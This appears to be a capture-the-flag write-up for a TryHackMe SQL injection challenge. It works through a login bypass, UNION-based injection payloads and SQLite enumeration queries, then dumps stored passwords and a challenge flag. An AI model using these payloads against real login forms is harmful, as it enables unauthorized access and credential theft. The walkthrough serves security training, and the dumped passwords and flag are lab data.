- The login page (http://10.10.147.112:5000/challenge2/home) id vulnerable to sqli.
- On logging in with payload `1' OR 1==1 -- -`
- We are greeted with a login screen with username admin

![login screenshot](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/8.png)

- Now, we know that we can try `UNION` SQL injection on this username field.
- Injected UNION SQL injection data until the query is successful (i.e., we are logged in)

```SQL
' UNION SELECT 1 -- -
' UNION SELECT 1,2 -- -
' UNION SELECT 1,2,3 -- -
' UNION SELECT 1,2,3,4 -- -
```

- Logged in with second payload, i.e., `' UNION SELECT 1,2 -- -`
- Now on home screen, we can see that we are logged in as 2, i.e. are second query. So we can inject code in place of `2`
![new screenshot with username 2](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/9.png)

- Started with enumeration DBMS
- Found out it to be sqlite 3.22.0

```SQL
' union select 1,sqlite_version() -- -
```

![screenshot for DBMS version](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/10.png)

- Now searched for table name.
- Found table name as users

```SQL
' UNION SELECT 1, group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'-- -
```

- Searched for column names inside the table.
- Found the output as

```SQL
CREATE TABLE users ( id integer primary key, username text unique not null, password text not null ) |
```

```SQL
' UNION SELECT 1,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users'-- - 
```

- Selected passwords from the table users
- Found password for current user as `345m3io4hj3`

```SQL
' UNION SELECT 1, password from users -- -
```

- Searched for all the passwords with `group_concat()`

```SQL
' UNION SELECT 1,group_concat(password) FROM users -- -
```

- Found passwords as 

```SQL
rcLYWHCxeGUsA9tH3GNV,asd,Summer2019!,345m3io4hj3,THM{fb381dfee71ef9c31b93625ad540c9fa},viking123
```
